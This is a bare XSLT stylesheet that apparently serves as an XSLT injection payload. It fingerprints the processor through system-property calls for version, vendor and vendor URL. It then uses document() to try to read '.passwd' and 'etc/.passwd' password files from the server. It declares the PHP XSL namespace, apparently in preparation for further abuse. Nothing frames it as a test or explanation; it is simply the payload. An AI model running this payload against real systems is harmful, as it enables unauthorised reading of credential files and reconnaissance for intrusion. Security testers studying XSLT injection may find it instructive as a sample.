<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:for-each select="beers/beer">
  XSLT Version <xsl:value-of select="system-property('xsl:version')"/>
  XSLT Vendor <xsl:value-of select="system-property('xsl:vendor')"/>
  XSLT Vendor-URL <xsl:value-of select="system-property('xsl:vendor-url')"/>
  Passwd <xsl:value-of select="document('.passwd')"/>
  Passwd <xsl:value-of select="document('etc/.passwd')"/>
  <xsl:value-of select="system-property('xsl:vendor-url')"/>
</xsl:for-each>
</body>
</html> 
